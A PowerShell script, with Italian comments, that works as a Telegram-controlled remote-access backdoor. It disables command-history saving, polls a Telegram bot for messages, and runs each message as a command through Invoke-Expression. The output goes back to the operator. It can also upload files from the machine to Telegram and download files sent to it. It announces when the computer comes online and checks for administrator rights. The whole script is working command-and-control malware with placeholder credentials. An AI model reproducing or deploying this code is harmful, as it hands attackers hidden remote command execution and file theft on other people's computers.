
Clear-Host  # Clear the shell
Set-PSReadlineOption    -HistorySaveStyle   SaveNothing
Set-Location            -Path               $env:USERPROFILE

$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id                = "@ID"
$api_token                  = "@TOKEN"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $api_token
$api_get_messages           = 'https://api.telegram.org/bot{0}/SendMessage'                 -f $api_token
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $api_token
$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $api_token
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $api_token, $telegram_id
$logs                       = $true
$Global:ProgressPreference  = 'SilentlyContinue'


function Log($string)
{
    if ($logs) {
        Write-Host -ForegroundColor Yellow -BackgroundColor Black ("+ [" + (get-date).ToString() + "] " + $string)
        Start-Sleep -Milliseconds 100
    }
}


function CheckAdminRights()
{
    Log "Controllo se lo script è in esecuzione come amministratore"
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ("L'utente '$env:USERNAME' ha i privilegi di amministratore")
    } else {
        return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore")
    }
}


function DownloadDocument ($file_id, $file_name)
{
    Log "Procedo a recuperare le informazioni del file da scaricare"
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path

    Log "Scarico il file [$($file_name)] nella macchina"
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session

    Log "Verifico che il file sia stato scaricato"
    if (Test-Path -Path $file_name) {
        Log "File scaricato con successo"
    } else {
        Log "Il file non è stato scaricato"
    }
}


function SendDocument($filePath) 
{
    SendMessage "Procedo ad inviare il file [$($filePath)]"
    if (Test-Path -Path $filePath -PathType Leaf) {
        try {
            SendMessage "Invio del file in corso"
            curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
            SendMessage "File inviato con successo"
        } catch {
            SendMessage "Errore durante l'upload del file: [$($Error[0])]"
        }
    } else {
        SendMessage "Il file indicato non è stato trovato"
    }
}

function SendMessage ($output)
{
    Log "Procedo ad inviare il messaggio"

    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $telegram_id
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + "[HOST ($hostia)]`n" + $output + "</pre>")
    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
        Log "Messaggio inviato con successo"
    } catch {
        Log "Il messaggio non è stato inviato: [$($Error[0])]"
        Start-Sleep -Seconds 3
    }
}


function CommandListener
{
    try {
        Log "Invio un avviso al controller che il bot è stato avviato con successo"
        SendMessage "Computer online!"
    } catch {
        Exit-PSSession
    }

    $offset = 0
    $hostia = $env:COMPUTERNAME
    $hostname = $hostia
    $wait = 1000

    # lavorare sul messaggio e non sul message id oppure usare un array che si aggiorna all'ultimo id e verifica se l'ultimo id è in lista, se è in lista non fare un cazzo, altrimenti esegui

    while ($true) {        
        try {
            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
            if ($message.result.Count -gt 0) {                
                if ($message.result.Count -gt $offset) {
                    if ($offset -eq 0) {
                        $offset = $message.result.Count
                        Start-Sleep -Seconds 1
                        continue
                    }

                    $offset     = $message.result.Count
                    $message    = $message.result.Message[-1]
                    $user_id    = $message.chat.id
                    $text       = $message.text
                    $document   = $message.document
                    
                    Log $offset
                    if ($text.Length -gt 0) {
                        $check_command = $text.Split()
                        if ($check_command[0] -match "SET") {
                            if ($check_command[1] -match $hostia) {
                                $hostname = $check_command[2]
                                SendMessage "Bot impostato per lavorare solo sull'host [$($hostname)]"
                                continue
                            }
                        } elseif ($check_command[0] -match "ONLINE") {
                            Log $offset
                            SendMessage "Computer operativo"
                            continue
                        }
                    }
        
                    if ($hostname -match $hostia) {
                        if ($user_id -match $telegram_id) {
                            if ($text.Length -gt 0) {
                                try {
                                    $output = Invoke-Expression -Command $text | Out-String
                                } catch {
                                    $output = $Error[0] | Out-String
                                }
        
                                $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
                                    $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
                                }                        
        
                                foreach ($block in $output_splitted) {
                                    $block = $block | Out-String
                                    SendMessage $block
                                }

                                if ($output_splitted.Count -eq 0) {
                                    Start-Sleep -Milliseconds 300
                                    SendMessage "Comando ricevuto/eseguito"
                                }
                            }

                            if ($document) {
                                $file_id   = $document.file_id
                                $file_name = $document.file_name
                                DownloadDocument $file_id $file_name
                            }
                        } else {
                            $unauth_user_found = ("Unauthorized user found! " + $user_id)
                            SendMessage $unauth_user_found
                        }
                    }
                    $wait = 900                
                }
            }

            if ($wait -eq 10000) {
                $wait = 1000
            } else {
                $wait = $wait + 100
            }

            Start-Sleep -Milliseconds $wait
        } catch {
            Log $Error[0]
            Start-Sleep -Seconds 5
        }
    }
    $session.Dispose()
}


CommandListener
